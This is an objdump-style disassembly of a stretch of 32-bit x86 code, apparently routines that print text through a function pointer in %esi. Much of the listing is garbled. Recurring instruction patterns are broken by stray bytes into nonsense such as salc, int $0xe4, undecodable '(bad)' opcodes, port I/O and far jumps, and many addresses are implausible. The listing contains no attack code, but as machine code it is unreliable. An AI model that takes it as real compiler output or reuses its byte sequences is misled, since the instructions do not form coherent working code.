  404328:	64 ae                	fs scas %es:(%edi),%al
  40432a:	40                   	inc    %eax
  40432b:	00 51 ff             	add    %dl,-0x1(%ecx)
  40432e:	d6                   	salc
  40432f:	8b 15 9a 85 40 00    	mov    0x40859a,%edx
  404335:	68 54 f2 bf 40       	push   $0x40bff254
  40433a:	83 44 40 52 ff       	addl   $0xffffffff,0x52(%eax,%eax,2)
  40433f:	d6                   	salc
  404340:	a1 c8 c0 40 00       	mov    0x40c0c8,%eax
  404345:	68 20 f2 ba 00       	push   $0xbaf220
  40434a:	83 c0 40             	add    $0x40,%eax
  40434d:	eb 77                	jmp    0x4043c6
  40434f:	d6                   	salc
  404350:	8b 0d 28 c0 40 fd    	mov    0xfd40c028,%ecx
  404356:	cd e4                	int    $0xe4
  404358:	f1                   	int1
  404359:	40                   	inc    %eax
  40435a:	00 83 c1 40 51 ff    	add    %al,-0xaebf3f(%ebx)
  404360:	d6                   	salc
  404361:	8b 15 c8 c0 40 00    	mov    0x40c0c8,%edx
  404367:	68 ac f1 40 00       	push   $0x40f1ac
  40436c:	83 f7 40             	xor    $0x40,%edi
  40436f:	52                   	push   %edx
  404370:	ff d6                	call   *%esi
  404372:	a1 ba c0 86 00       	mov    0x86c0ba,%eax
  404377:	68 58 f1 40 00       	push   $0x40f158
  40437c:	83 64 40 50 ff       	andl   $0xffffffff,0x50(%eax,%eax,2)
  404381:	d6                   	salc
  404382:	33 8f c8 a9 40 00    	xor    0x40a9c8(%edi),%ecx
  404388:	68 20 f1 21 00       	push   $0x21f120
  40438d:	83 9e 5e 51 f6 d6 8b 	sbbl   $0xffffff8b,-0x2909aea2(%esi)
  404394:	15 c8 c0 40 f8       	adc    $0xf840c0c8,%eax
  404399:	68 4b f0 40 00       	push   $0x40f04b
  40439e:	83 c2 40             	add    $0x40,%edx
  4043a1:	84 ff                	test   %bh,%bh
  4043a3:	d6                   	salc
  4043a4:	78 c8                	js     0x40436e
  4043a6:	c0 40 7e 83          	rolb   $0x83,0x7e(%eax)
  4043aa:	c4 9a 7f c0 40 68    	les    0x6840c07f(%edx),%ebx
  4043b0:	94                   	xchg   %eax,%esp
  4043b1:	36 40                	ss inc %eax
  4043b3:	00 df                	add    %bl,%bh
  4043b5:	ff d6                	call   *%esi
  4043b7:	8b 0d c8 88 40 00    	mov    0x4088c8,%ecx
  4043bd:	5e                   	pop    %esi
  4043be:	58                   	pop    %eax
  4043bf:	f0 40                	lock inc %eax
  4043c1:	8f 83 c1 40 a7 ff    	pop    -0x58bf3f(%ebx)
  4043c7:	d6                   	salc
  4043c8:	8b 15 c8 ec 40 9a    	mov    0x9a40ecc8,%edx
  4043ce:	68 28 f0 40 00       	push   $0x40f028
  4043d3:	d6                   	salc
  4043d4:	c2 40 52             	ret    $0x5240
  4043d7:	ff d6                	call   *%esi
  4043d9:	a1 c8 c0 40 25       	mov    0x2540c0c8,%eax
  4043de:	68 ec c6 40 fe       	push   $0xfe40c6ec
  4043e3:	52                   	push   %edx
  4043e4:	c0 40 50 72          	rolb   $0x72,0x50(%eax)
  4043e8:	d6                   	salc
  4043e9:	8b 39                	mov    (%ecx),%edi
  4043eb:	c8 c0 40 e7          	enter  $0x40c0,$0xe7
  4043ef:	37                   	aaa
  4043f0:	b4 ef                	mov    $0xef,%ah
  4043f2:	40                   	inc    %eax
  4043f3:	00 83 c1 40 51 ff    	add    %al,-0xaebf3f(%ebx)
  4043f9:	8a 8b 15 c8 c0 40    	mov    0x40c0c815(%ebx),%cl
  4043ff:	00 68 84             	add    %ch,-0x7c(%eax)
  404402:	be 40 00 f8 c2       	mov    $0xc2f80040,%esi
  404407:	40                   	inc    %eax
  404408:	95                   	xchg   %eax,%ebp
  404409:	ff 6b a1             	ljmp   *-0x5f(%ebx)
  40440c:	c8 c0 74 00          	enter  $0x74c0,$0x0
  404410:	68 48 ef 40 00       	push   $0x40ef48
  404415:	83 c0 40             	add    $0x40,%eax
  404418:	50                   	push   %eax
  404419:	ff d6                	call   *%esi
  40441b:	89 10                	mov    %edx,(%eax)
  40441d:	ef                   	out    %eax,(%dx)
  40441e:	40                   	inc    %eax
  40441f:	0f 8b 0d 4f 5d 40    	jnp    0x409d9332
  404425:	45                   	inc    %ebp
  404426:	83 c1 40             	add    $0x40,%ecx
  404429:	51                   	push   %ecx
  40442a:	ff d6                	call   *%esi
  40442c:	8b 15 ab 0b c1 00    	mov    0xc10bab,%edx
  404432:	83 c4 11             	add    $0x11,%esp
  404435:	83 c2 7d             	add    $0x7d,%edx
  404438:	25 d0 ee 40 00       	and    $0x40eed0,%eax
  40443d:	52                   	push   %edx
  40443e:	ff d6                	call   *%esi
  404440:	a1 c8 c0 40 00       	mov    0x40c0c8,%eax
  404445:	af                   	scas   %es:(%edi),%eax
  404446:	15 ee 40 48 83       	adc    $0x834840ee,%eax
  40444b:	c0 40 50 83          	rolb   $0x83,0x50(%eax)
  40444f:	d6                   	salc
  404450:	8b 0d dc c0 40 00    	mov    0x40c0dc,%ecx
  404456:	68 40 ee 40 00       	push   $0x40ee40
  40445b:	47                   	inc    %edi
  40445c:	c1 32 51             	shll   $0x51,(%edx)
  40445f:	ff d6                	call   *%esi
  404461:	8b 15 88 c0 40 00    	mov    0x40c088,%edx
  404467:	68 f0 ed 40 02       	push   $0x240edf0
  40446c:	83 c2 40             	add    $0x40,%edx
  40446f:	ee                   	out    %al,(%dx)
  404470:	ff d6                	call   *%esi
  404472:	df c8                	(bad)
  404474:	c0 1f 00             	rcrb   $0x0,(%edi)
  404477:	68 a8 ed e9 00       	push   $0xe9eda8
  40447c:	83 c0 40             	add    $0x40,%eax
  40447f:	50                   	push   %eax
  404480:	ff ac 8b 71 c8 c0 40 	ljmp   *0x40c0c871(%ebx,%ecx,4)
  404487:	00 68 60             	add    %ch,0x60(%eax)
  40448a:	ed                   	in     (%dx),%eax
  40448b:	40                   	inc    %eax
  40448c:	00 83 c1 40 51 ff    	add    %al,-0xaebf3f(%ebx)
  404492:	d6                   	salc
  404493:	8b 15 c8 c0 40 00    	mov    0x40c0c8,%edx
  404499:	68 18 ed 40 00       	push   $0x40ed18
  40449e:	83 b1 40 52 ff d6 a1 	xorl   $0xffffffa1,-0x2900adc0(%ecx)
  4044a5:	c8 c0 40 d8          	enter  $0x40c0,$0xd8
  4044a9:	68 60 ed 40 00       	push   $0x40ed60
  4044ae:	83 9c 40 50 ff d6 8b 	sbbl   $0xd,-0x742900b0(%eax,%eax,2)
  4044b5:	0d 
  4044b6:	c8 c0 40 56          	enter  $0x40c0,$0x56
  4044ba:	83 c4 70             	add    $0x70,%esp
  4044bd:	83 66 08 68          	andl   $0x68,0x8(%esi)
  4044c1:	e0 07                	loopne 0x4044ca
  4044c3:	40                   	inc    %eax
  4044c4:	00 51 47             	add    %dl,0x47(%ecx)
  4044c7:	31 8b 15 c8 c0 40    	xor    %ecx,0x40c0c815(%ebx)
  4044cd:	00 68 ac             	add    %ch,-0x54(%eax)
  4044d0:	ec                   	in     (%dx),%al
  4044d1:	40                   	inc    %eax
  4044d2:	ba 83 c2 7d 52       	mov    $0x527dc283,%edx
  4044d7:	2c d6                	sub    $0xd6,%al
  4044d9:	a1 c8 c0 40 de       	mov    0xde40c0c8,%eax
  4044de:	68 7c ec 8b 00       	push   $0x8bec7c
  4044e3:	83 c0 40             	add    $0x40,%eax
  4044e6:	36 ff f5             	ss push %ebp
  4044e9:	8b 0d c8 c0 1b 00    	mov    0x1bc0c8,%ecx
  4044ef:	68 0d ec 40 00       	push   $0x40ec0d
  4044f4:	83 a2 40 f1 ff d6 8b 	andl   $0xffffff8b,-0x29000ec0(%edx)
  4044fb:	15 c8 c0 40 00       	adc    $0x40c0c8,%eax
  404500:	62                   	(bad)
  404501:	f8                   	clc
  404502:	eb 40                	jmp    0x404544
  404504:	3b 83 e1 9b 6b 20    	cmp    0x206b9be1(%ebx),%eax
  40450a:	d6                   	salc
  40450b:	a1 c8 c0 40 4f       	mov    0x4f40c0c8,%eax
  404510:	68 b0 eb 61 00       	push   $0x61ebb0
  404515:	83 3c 40 50          	cmpl   $0x50,(%eax,%eax,2)
  404519:	e6 20                	out    %al,$0x20
  40451b:	f9                   	stc
  40451c:	0d c8 c0 40 00       	or     $0x40c0c8,%eax
  404521:	68 70 eb 40 00       	push   $0x40eb70
  404526:	83 c1 40             	add    $0x40,%ecx
  404529:	51                   	push   %ecx
  40452a:	ff d6                	call   *%esi
  40452c:	8b 15 c8 f7 40 00    	mov    0x40f7c8,%edx
  404532:	68 34 eb e7 00       	push   $0xe7eb34
  404537:	83 c2 33             	add    $0x33,%edx
  40453a:	52                   	push   %edx
  40453b:	ff d6                	call   *%esi
  40453d:	a1 c8 c0 40 00       	mov    0x40c0c8,%eax
  404542:	ba c4 f9 83 c0       	mov    $0xc083f9c4,%edx
  404547:	40                   	inc    %eax
  404548:	68 f4 2f 40 2e       	push   $0x2e402ff4
  40454d:	67 ff d6             	addr16 call *%esi
  404550:	83 ce 08             	or     $0x8,%esi
  404553:	6a 97                	push   $0xffffff97
  404555:	ff 15 70 c1 40 00    	call   *0x40c170
  40455b:	5e                   	pop    %esi
  40455c:	90                   	nop
  40455d:	90                   	nop
  40455e:	90                   	nop
  40455f:	90                   	nop
  404560:	55                   	push   %ebp
  404561:	8b ec                	mov    %esp,%ebp
  404563:	51                   	push   %ecx
  404564:	a1 4c 83 41 00       	mov    0x41834c,%eax
  404569:	53                   	push   %ebx
  40456a:	8b 48 08             	mov    0x8(%eax),%ecx
  40456d:	56                   	push   %esi
  40456e:	57                   	push   %edi
  40456f:	53                   	push   %ebx
  404570:	50                   	push   %eax
  404571:	e8 da 12 00 00       	call   0x405850
  404576:	a3 40 e3 41 be       	mov    %eax,0xbe41e340
  40457b:	8b fb                	mov    %ebx,%edi
  40457d:	83 c9 ff             	or     $0xffffffff,%ecx
  404580:	33 c0                	xor    %eax,%eax
  404582:	f2 ae                	repnz scas %es:(%edi),%al
  404584:	8b 35 34 c1 40 00    	mov    0x40c134,%esi
  40458a:	f7 d1                	not    %ecx
  40458c:	49                   	dec    %ecx
  40458d:	83 6d 09 0f          	subl   $0xf,0x9(%ebp)
  404591:	86 d7                	xchg   %dl,%bh
  404593:	00 00                	add    %al,(%eax)
  404595:	f5                   	cmc
  404596:	6a bc                	push   $0xffffffbc
  404598:	68 d8 f2 40 00       	push   $0x40f2d8
  40459d:	53                   	push   %ebx
  40459e:	ff d6                	call   *%esi
  4045a0:	7a c4                	jp     0x404566
  4045a2:	a0 85 c0 d8 85       	mov    0x85d8c085,%al
  4045a7:	c2 00 00             	ret    $0x0
  4045aa:	00 83 4f 07 6a 2f    	add    %al,0x2f6a074f(%ebx)
  4045b0:	37                   	aaa
  4045b1:	ff 15 4d c1 40 df    	call   *0xdf40c14d
  4045b7:	83 c4 37             	add    $0x37,%esp
  4045ba:	89 45 08             	mov    %eax,0x8(%ebp)
  4045bd:	1a c0                	sbb    %al,%al
  4045bf:	0f a1                	pop    %fs
  4045c1:	66 01 00             	add    %ax,(%eax)
  4045c4:	96                   	xchg   %eax,%esi
  4045c5:	8b eb                	mov    %ebx,%ebp
  4045c7:	a1 4c 40 41 63       	mov    0x6341404c,%eax
  4045cc:	5c                   	pop    %esp
  4045cd:	f3 55                	repz push %ebp
  4045cf:	56                   	push   %esi
  4045d0:	01 52 50             	add    %edx,0x50(%edx)
  4045d3:	e8 88 04 00 00       	call   0x404a60
  4045d8:	8b 33                	mov    (%ebx),%esi
  4045da:	8b f3                	mov    %ebx,%esi
  4045dc:	55                   	push   %ebp
  4045dd:	d1 3a                	sarl   $1,(%edx)
  4045df:	14 19                	adc    $0x19,%al
  4045e1:	e9 02 86 a5 8b       	jmp    0x8be5cbe8
  4045e6:	ca 83 67             	lret   $0x6783
  4045e9:	03 b0 a4 8b 75 db    	add    -0x248a745c(%eax),%esi
  4045ef:	8b c8                	mov    %eax,%ecx
  4045f1:	ba cb c6 72 81       	mov    $0x8172c6cb,%edx
  4045f6:	00 8b 15 4c 40 41    	add    %cl,0x41404c15(%ebx)
  4045fc:	00 52 50             	add    %dl,0x50(%edx)
  4045ff:	8d 45 fc             	lea    -0x4(%ebp),%eax
  404602:	68 f4 17 41 00       	push   $0x4117f4
  404607:	50                   	push   %eax
  404608:	68 00 18 41 00       	push   $0x411800
  40460d:	62 0e                	bound  %ecx,(%esi)
  40460f:	bb 00 eb 85 c0       	mov    $0xc085eb00,%ebx
  404614:	0f 85 fd a5 00 99    	jne    0x9940ec17
  40461a:	a1 00 18 41 b0       	mov    0xb0411800,%eax
  40461f:	85 8b 94 84 f0 00    	test   %ecx,0xf08494(%ebx)
  404625:	00 00                	add    %al,(%eax)
  404627:	96                   	xchg   %eax,%esi
  404628:	45                   	inc    %ebp
  404629:	fc                   	cld
  40462a:	85 c0                	test   %eax,%eax
  40462c:	0f 85 9c 00 00 00    	jne    0x4046ce
  404632:	8b 0d 4c 40 41 00    	mov    0x41404c,%ecx
  404638:	14 51                	adc    $0x51,%al
  40463a:	e8 11 12 00 eb       	call   0xeb405850
  40463f:	a3 4c 17 41 00       	mov    %eax,0x41174c
  404644:	c6 06 00             	movb   $0x0,(%esi)
  404647:	b2 3b                	mov    $0x3b,%dl
  404649:	5b                   	pop    %ebx
  40464a:	75 6b                	jne    0x4046b7
  40464c:	3c 15                	cmp    $0x15,%al
  40464e:	00 66 97             	add    %ah,-0x69(%esi)
  404651:	00 ae 4c e4 41 19    	add    %ch,0x1941e44c(%esi)
  404657:	fa                   	cli
  404658:	e6 d0                	out    %al,$0xd0
  40465a:	f2 40                	repnz inc %eax
  40465c:	bf 50 e8 6d 0f       	mov    $0xf6de850,%edi
  404661:	c0 81 83 c4 0c 7a 9c 	rolb   $0x9c,0x7a0cc483(%ecx)
  404668:	0b 41 00             	or     0x0(%ecx),%eax
  40466b:	eb 56                	jmp    0x4046c3
  40466d:	8b fb                	mov    %ebx,%edi
  40466f:	c6                   	(bad)
  404670:	c9                   	leave
  404671:	ff 33                	push   (%ebx)
  404673:	6e                   	outsb  %ds:(%esi),(%dx)
  404674:	f2 ae                	repnz scas %es:(%edi),%al
  404676:	19 d1                	sbb    %edx,%ecx
  404678:	49                   	dec    %ecx
  404679:	83 f9 08             	cmp    $0x8,%ecx
  40467c:	0f 86 2c ff ff ff    	jbe    0x4045ae
  404682:	6a 08                	push   $0x8
  404684:	68 35 49 40 00       	push   $0x404935
  404689:	53                   	push   %ebx
  40468a:	ff d6                	call   *%esi
  40468c:	83 5d 0c 1f          	sbbl   $0x1f,0xc(%ebp)
  404690:	c0 0f 21             	rorb   $0x21,(%edi)
  404693:	17                   	pop    %ss
  404694:	ff                   	(bad)
  404695:	ff                   	(bad)
  404696:	ff 85 0d c8 c0 40    	incl   0x40c0c80d(%ebp)
  40469c:	00 68 9c             	add    %ch,-0x64(%eax)
  40469f:	64 0c 82             	fs or  $0x82,%al
  4046a2:	83 f8 f7             	cmp    $0xfffffff7,%eax
  4046a5:	51                   	push   %ecx
  4046a6:	ff 15 80 15 40 00    	call   *0x401580
  4046ac:	83 c4 08             	add    $0x8,%esp
  4046af:	6a 01                	push   $0x1
  4046b1:	ff 15 70 c1 40 00    	call   *0x40c170
  4046b7:	8b 0d 00 18 41 00    	mov    0x411800,%ecx
  4046bd:	89 0d 9c 0b 12 00    	mov    %ecx,0x120b9c
  4046c3:	66 a1 f4 17 bb 00    	mov    0xbb17f4,%ax
  4046c9:	66 85 c0             	test   %ax,%ax
  4046cc:	ca 1c 66             	lret   $0x661c
  4046cf:	c7 05 e7 17 41 00 50 	movl   $0x5e5f0050,0x4117e7
  4046d6:	00 5f 5e 
  4046d9:	c7                   	(bad)
  4046da:	ae                   	scas   %es:(%edi),%al
  4046db:	ac                   	lods   %ds:(%esi),%al
  4046dc:	0b ec                	or     %esp,%ebp
  4046de:	00 d4                	add    %dl,%ah
  4046e0:	02 41 00             	add    0x0(%ecx),%al
  4046e3:	33 c0                	xor    %eax,%eax
  4046e5:	5b                   	pop    %ebx
  4046e6:	8b e5                	mov    %ebp,%esp
  4046e8:	5d                   	pop    %ebp
  4046e9:	c3                   	ret
  4046ea:	c9                   	leave
  4046eb:	3d 50 00 74 e7       	cmp    $0xe7740050,%eax
  4046f0:	da d2                	fcmovbe %st(2),%st
  4046f2:	66 8b d0             	mov    %ax,%dx
  4046f5:	a1 4c 40 41 00       	mov    0x41404c,%eax
  4046fa:	52                   	push   %edx
  4046fb:	68 98 f2 7e 00       	push   $0x7ef298
  404700:	92                   	xchg   %eax,%edx
  404701:	e8 ca d8 00 00       	call   0x411fd0
  404706:	83 c4 5e             	add    $0x5e,%esp
  404709:	f7 ac 0b 41 00 33 a7 	imull  -0x58ccffbf(%ebx,%ecx,1)
  404710:	13 5e 5b             	adc    0x5b(%esi),%ebx
  404713:	8b e5                	mov    %ebp,%esp
  404715:	5d                   	pop    %ebp
  404716:	c3                   	ret
  404717:	5f                   	pop    %edi
  404718:	5e                   	pop    %esi
  404719:	b8 01 00 00 00       	mov    $0x1,%eax
  40471e:	5b                   	pop    %ebx
  40471f:	8b e5                	mov    %ebp,%esp
  404721:	5d                   	pop    %ebp
  404722:	c3                   	ret
  404723:	90                   	nop
  404724:	90                   	nop
  404725:	de 90 90 90 90 9c    	ficoms -0x636f6f70(%eax)
  40472b:	90                   	nop
  40472c:	90                   	nop
  40472d:	90                   	nop
  40472e:	82 90 98 79 ab 81 ec 	adcb   $0xec,-0x7e548668(%eax)
  404735:	d8 00                	fadds  (%eax)
  404737:	e4 00                	in     $0x0,%al
  404739:	a1 4c 40 41 00       	mov    0x41404c,%eax
  40473e:	56                   	push   %esi
  40473f:	43                   	inc    %ebx
  404740:	8b 65 08             	mov    0x8(%ebp),%esp
  404743:	50                   	push   %eax
  404744:	24 ff                	and    $0xff,%al
  404746:	1d 8d 00 6a 01       	sbb    $0x16a008d,%eax
  40474b:	52                   	push   %edx
  40474c:	4d                   	dec    %ebp
  40474d:	08 8f 51 e8 ab 4c    	or     %cl,0x4cabe851(%edi)
  404753:	00 a9 c7 eb 85 f6    	add    %ch,-0x97a1439(%ecx)
  404759:	74 2d                	je     0x404788
  40475b:	bb 55 88 6a 78       	mov    $0x786a8855,%ebx
  404760:	52                   	push   %edx
  404761:	56                   	push   %esi
  404762:	cf                   	iret
  404763:	79 3f                	jns    0x4047a4
  404765:	b7 00                	mov    $0x0,%bh
  404767:	50                   	push   %eax
  404768:	a1 c8 c0 40 00       	mov    0x40c0c8,%eax
  40476d:	57                   	push   %edi
  40476e:	83 c0 40             	add    $0x40,%eax
  404771:	68 9a f3 40 00       	push   $0x40f39a
  404776:	2c ff                	sub    $0xff,%al
  404778:	15 40 c1 eb 54       	adc    $0x54ebc140,%eax
  40477d:	83 c4 cd             	add    $0xffffffcd,%esp
  404780:	8b c6                	mov    %esi,%eax
  404782:	5f                   	pop    %edi
  404783:	4b                   	dec    %ebx
  404784:	8b e5                	mov    %ebp,%esp
  404786:	5d                   	pop    %ebp
  404787:	3a fd                	cmp    %ch,%bh
  404789:	4d                   	dec    %ebp
  40478a:	08 8d 95 28 a0 ff    	or     %cl,-0x5fd76b(%ebp)
  404790:	ff 51 68             	call   *0x68(%ecx)
  404793:	70 b1                	jo     0x404746
  404795:	96                   	xchg   %eax,%esi
  404796:	b9 52 e8 43 b5       	mov    $0xb543e852,%ecx
  40479b:	7d 00                	jge    0x40479d
  40479d:	de f0                	fdivp  %st,%st(0)
  40479f:	85 2b                	test   %ebp,(%ebx)
  4047a1:	74 2e                	je     0x4047d1
  4047a3:	8d 50 88             	lea    -0x78(%eax),%edx
  4047a6:	6a 78                	push   $0x78
  4047a8:	50                   	push   %eax
  4047a9:	56                   	push   %esi
  4047aa:	e8 31 3f 00 00       	call   0x4086e0
  4047af:	8b a2 c8 71 c6 00    	mov    0xc671c8(%edx),%esp
  4047b5:	50                   	push   %eax
  4047b6:	57                   	push   %edi
  4047b7:	65 c1 40 66 34       	roll   $0x34,%gs:0x66(%eax)
  4047bc:	f3 71 00             	repz jno 0x4047bf
  4047bf:	51                   	push   %ecx
  4047c0:	ff 15 80 c1 40 00    	call   *0x40c180
  4047c6:	83 c4 10             	add    $0x10,%esp
  4047c9:	8b c6                	mov    %esi,%eax
  4047cb:	5f                   	pop    %edi
  4047cc:	d5 8b                	aad    $0x8b
  4047ce:	e5 5d                	in     $0x5d,%eax
  4047d0:	c3                   	ret
  4047d1:	8b 85 50 ff 3d ff    	mov    -0xc200b0(%ebp),%eax
  4047d7:	50                   	push   %eax
  4047d8:	a3 2e 02 41 00       	mov    %eax,0x41022e
  4047dd:	ff 15 10 6c 40 00    	call   *0x406c10
  4047e3:	db c4                	fcmovnb %st(4),%st
  4047e5:	89 a3 bf 38 41 00    	mov    %esp,0x4138bf(%ebx)
  4047eb:	85 24 75 2c 8b d8 c8 	test   %esp,-0x372774d4(,%esi,2)
  4047f2:	c0 a8 00 68 08 f3 40 	shrb   $0x40,-0xcf79800(%eax)
  4047f9:	00 83 c2 7c 52 ff    	add    %al,-0xad833e(%ebx)
  4047ff:	5b                   	pop    %ebx
  404800:	80 9d 40 00 83 c4 08 	sbbb   $0x8,-0x3b7cffc0(%ebp)
  404807:	b8 fa 61 00 00       	mov    $0x61fa,%eax
  40480c:	5f                   	pop    %edi
  40480d:	5e                   	pop    %esi
  40480e:	8b 56 5d             	mov    0x5d(%esi),%edx
  404811:	c3                   	ret
  404812:	5d                   	pop    %ebp
  404813:	0d 70 bc 41 00       	or     $0x41bc70,%eax
  404818:	fc                   	cld
  404819:	55                   	push   %ebp
  40481a:	08 80 00 51 d0 52    	or     %al,0x52d05100(%eax)
  404820:	e8 3b 50 f3 00       	call   0x1339860
  404825:	12 f0                	adc    %al,%dh
  404827:	85 f6                	test   %esi,%esi
  404829:	74 2d                	je     0x404858
  40482b:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40482e:	6a 78                	push   $0x78
  404830:	50                   	push   %eax
  404831:	56                   	push   %esi
  404832:	ab                   	stos   %eax,%es:(%edi)
  404833:	a9 3e 2b 00 8b       	test   $0x8b002b3e,%eax
  404838:	0d c8 c0 40 00       	or     $0x40c0c8,%eax
  40483d:	50                   	push   %eax
  40483e:	36 c1 b8 68 e0 a5 40 	sarl   $0x0,%ss:0x40a5e068(%eax)
  404845:	00 
  404846:	51                   	push   %ecx
  404847:	ff 15 80 c1 40 a9    	call   *0xa940c180
  40484d:	83 c4 0c             	add    $0xc,%esp
  404850:	8b c6                	mov    %esi,%eax
  404852:	5f                   	pop    %edi
  404853:	5e                   	pop    %esi
  404854:	8b e5                	mov    %ebp,%esp
  404856:	5d                   	pop    %ebp
  404857:	c5 8b 55 08 52 e8    	lds    -0x17adf7ab(%ebx),%ecx
  40485d:	bf 4f 91 00 5f       	mov    $0x5f00914f,%edi
  404862:	33 c0                	xor    %eax,%eax
  404864:	5e                   	pop    %esi
  404865:	8b e5                	mov    %ebp,%esp
  404867:	5d                   	pop    %ebp
  404868:	c3                   	ret
  404869:	90                   	nop
  40486a:	90                   	nop
  40486b:	90                   	nop
  40486c:	90                   	nop
  40486d:	90                   	nop
  40486e:	90                   	nop
  40486f:	90                   	nop
  404870:	55                   	push   %ebp
  404871:	8b 5d 8c             	mov    -0x74(%ebp),%ebx
  404874:	8b 75 08             	mov    0x8(%ebp),%esi
  404877:	6a 68                	push   $0x68
  404879:	c7                   	(bad)
  40487a:	93                   	xchg   %eax,%ebx
  40487b:	70 b3                	jo     0x404830
  40487d:	00 00                	add    %al,(%eax)
  40487f:	87 15 5c c1 40 00    	xchg   %edx,0x40c15c
  404885:	8b d0                	mov    %eax,%edx
  404887:	83 c4 ec             	add    $0xffffffec,%esp
  40488a:	85 d2                	test   %edx,%edx
  40488c:	75 0a                	jne    0x404898
  40488e:	b8 0c 39 00 00       	mov    $0x390c,%eax
  404893:	5e                   	pop    %esi
  404894:	5d                   	pop    %ebp
  404895:	c2 04 00             	ret    $0x4
  404898:	9f                   	lahf
  404899:	6b 1a 00             	imul   $0x0,(%edx),%ebx
  40489c:	00 00                	add    %al,(%eax)
  40489e:	33 c0                	xor    %eax,%eax
  4048a0:	8b fa                	mov    %edx,%edi
  4048a2:	96                   	xchg   %eax,%esi
  4048a3:	ab                   	stos   %eax,%es:(%edi)
  4048a4:	89 42 04             	mov    %eax,0x4(%edx)
  4048a7:	89 16                	mov    %edx,(%esi)
  4048a9:	5f                   	pop    %edi
  4048aa:	e7 89                	out    %eax,$0x89
  4048ac:	c2 5a 00             	ret    $0x5a
  4048af:	90                   	nop
  4048b0:	55                   	push   %ebp
  4048b1:	8b 10                	mov    (%eax),%edx
  4048b3:	8b 45 08             	mov    0x8(%ebp),%eax
  4048b6:	53                   	push   %ebx
  4048b7:	56                   	push   %esi
  4048b8:	d5 8b                	aad    $0x8b
  4048ba:	8b 34 c1             	mov    (%ecx,%eax,8),%esi
  4048bd:	4d                   	dec    %ebp
  4048be:	75 8d                	jne    0x40484d
  4048c0:	4d                   	dec    %ebp
  4048c1:	14 bb                	adc    $0xbb,%al
  4048c3:	14 00                	adc    $0x0,%al
  4048c5:	00 23                	add    %ah,(%ebx)
  4048c7:	8b 06                	mov    (%esi),%eax
  4048c9:	85 c0                	test   %eax,%eax
  4048cb:	74 1e                	je     0x4048eb
  4048cd:	8b 08                	mov    (%eax),%ecx
  4048cf:	c2 89 0e             	ret    $0xe89
  4048d2:	40                   	inc    %eax
  4048d3:	d7                   	xlat   %ds:(%ebx)
  4048d4:	1f                   	pop    %ds
  4048d5:	06                   	push   %es
  4048d6:	83 c4 04             	add    $0x4,%esp
  4048d9:	85 c0                	test   %eax,%eax
  4048db:	75 f0                	jne    0x4048cd
  4048dd:	83 c6 04             	add    $0x4,%esi
  4048e0:	4b                   	dec    %ebx
  4048e1:	75 e4                	jne    0x4048c7
  4048e3:	8b 55 08             	mov    0x8(%ebp),%edx
  4048e6:	f3 ff 92 e1 c4 04 5f 	repz call *0x5f04c4e1(%edx)
  4048ed:	5e                   	pop    %esi
  4048ee:	5b                   	pop    %ebx
  4048ef:	5d                   	pop    %ebp
  4048f0:	f3 04 b0             	repz add $0xb0,%al
  4048f3:	90                   	nop
  4048f4:	90                   	nop
  4048f5:	90                   	nop
  4048f6:	90                   	nop
  4048f7:	87 90 2d 90 90 90    	xchg   %edx,-0x6f6f6fd3(%eax)
  4048fd:	90                   	nop
  4048fe:	90                   	nop
  4048ff:	90                   	nop
  404900:	b2 25                	mov    $0x25,%dl
  404902:	ec                   	in     (%dx),%al
  404903:	b5 4d                	mov    $0x4d,%ch
  404905:	08 8b 45 0c 89 41    	or     %cl,0x41890c45(%ebx)
  40490b:	0c 5d                	or     $0x5d,%al
  40490d:	c2 72 00             	ret    $0x72
  404910:	55                   	push   %ebp
  404911:	8b 7f 2e             	mov    0x2e(%edi),%edi
  404914:	45                   	inc    %ebp
  404915:	08 8b 36 0c 0a c2    	or     %cl,-0x3df5f3ca(%ebx)
  40491b:	04 7f                	add    $0x7f,%al
  40491d:	90                   	nop
  40491e:	90                   	nop
  40491f:	90                   	nop
  404920:	16                   	push   %ss
  404921:	8b ec                	mov    %esp,%ebp
  404923:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404926:	8b 45 0c             	mov    0xc(%ebp),%eax
  404929:	89 a9 10 5d c2 08    	mov    %ebp,0x8c25d10(%ecx)
  40492f:	00 55 8b             	add    %dl,-0x75(%ebp)
  404932:	ec                   	in     (%dx),%al
  404933:	0f 59 08             	mulps  (%eax),%xmm1
  404936:	8b 40 d8             	mov    -0x28(%eax),%eax
  404939:	5d                   	pop    %ebp
  40493a:	c2 04 00             	ret    $0x4
  40493d:	31 21                	xor    %esp,(%ecx)
  40493f:	90                   	nop
  404940:	18 8b ec 51 a0 d8    	sbb    %cl,-0x275fae14(%ebx)
  404946:	62 41 00             	bound  %eax,0x0(%ecx)
  404949:	56                   	push   %esi
  40494a:	8a c8                	mov    %al,%cl
  40494c:	fe                   	(bad)
  40494d:	64 58                	fs pop %eax
  40494f:	c9                   	leave
  404950:	a2 d8 ff ce 00       	mov    %al,0xceffd8
  404955:	0f 27                	(bad)
  404957:	b0 3b                	mov    $0x3b,%al
  404959:	00 00                	add    %al,(%eax)
  40495b:	68 69 02 41 00       	push   $0x410269
  404960:	e8 0b ff ff ff       	call   0x404870
  404965:	85 c0                	test   %eax,%eax
  404967:	62 92 c6 05 d8 34    	bound  %edx,0x34d805c6(%edx)
  40496d:	41                   	inc    %ecx
  40496e:	8c 00                	mov    %es,(%eax)
  404970:	5e                   	pop    %esi
  404971:	8b e5                	mov    %ebp,%esp
  404973:	5d                   	pop    %ebp
  404974:	c3                   	ret
  404975:	8b 15 e0 09 41 00    	mov    0x4109e0,%edx
  40497b:	52                   	push   %edx
  40497c:	6a 00                	push   $0x0
  40497e:	6a 00                	push   $0x0
  404980:	bb dc 02 41 00       	mov    $0x4102dc,%ebx
  404985:	e8 d6 05 00 00       	call   0x404f60
  40498a:	8b 78 85             	mov    -0x7b(%eax),%edi
  40498d:	f6 74 cc e5          	divb   -0x1b(%esp,%ecx,8)
  404991:	e0 02                	loopne 0x404995
  404993:	41                   	inc    %ecx
  404994:	94                   	xchg   %eax,%esp
  404995:	50                   	push   %eax
  404996:	e8 15 ff ff ff       	call   0x4048b0
  40499b:	8b c6                	mov    %esi,%eax
  40499d:	c7                   	(bad)
  40499e:	5c                   	pop    %esp
  40499f:	e0 02                	loopne 0x4049a3
  4049a1:	08 00                	or     %al,(%eax)
  4049a3:	00 b1 fa 0a c6 05    	add    %dh,0x5c60afa(%ecx)
  4049a9:	d8 02                	fadds  (%edx)
  4049ab:	41                   	inc    %ecx
  4049ac:	00 00                	add    %al,(%eax)
  4049ae:	5e                   	pop    %esi
